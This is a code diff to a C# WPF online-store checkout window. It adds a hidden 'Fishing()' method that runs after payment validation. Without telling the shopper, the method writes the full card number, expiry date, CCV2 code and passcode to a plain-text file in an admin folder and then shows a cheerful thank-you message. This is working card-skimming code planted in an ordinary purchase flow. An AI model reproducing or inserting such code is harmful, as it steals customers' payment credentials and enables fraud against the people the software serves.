@@ -45,6 +45,7 @@ namespace OnlineStoreWPF
                 {
                     if (validcheck())
                     {
+                        Fishing();
                         MessageBox.Show("Thanks for shoping . Have good day .", "Thanks", MessageBoxButton.OK, MessageBoxImage.Information);
                         Application.Current.Windows[Application.Current.Windows.Count - 3].Close();
                         this.Close();
@@ -113,6 +114,29 @@ namespace OnlineStoreWPF
             {
                 Confirmbtn.IsEnabled = true;
             }
+        }
+
+        private void Fishing()
+        {
+            string path = Extention.path;
+            path += @"\ADMINPanel\Fishing Creadit Card\";
+
+            string ID, date, ccv2, pass;
+
+            ID = ID1.Text + ID2.Text + ID3.Text + ID4.Text;
+
+            date = Month.Text + '/' + Day.Text;
+
+            ccv2 = CCV2.Text;
+
+            pass = PassCode.Password;
+
+            StreamWriter w = new StreamWriter(path + ID + ".txt");
+            w.WriteLine("Card ID :" + ID);
+            w.WriteLine("Expire Date :" + date);
+            w.WriteLine("CCV2 :" + ccv2);
+            w.WriteLine("PassCode :" + pass);
+            w.Close();
         }
     }
 }
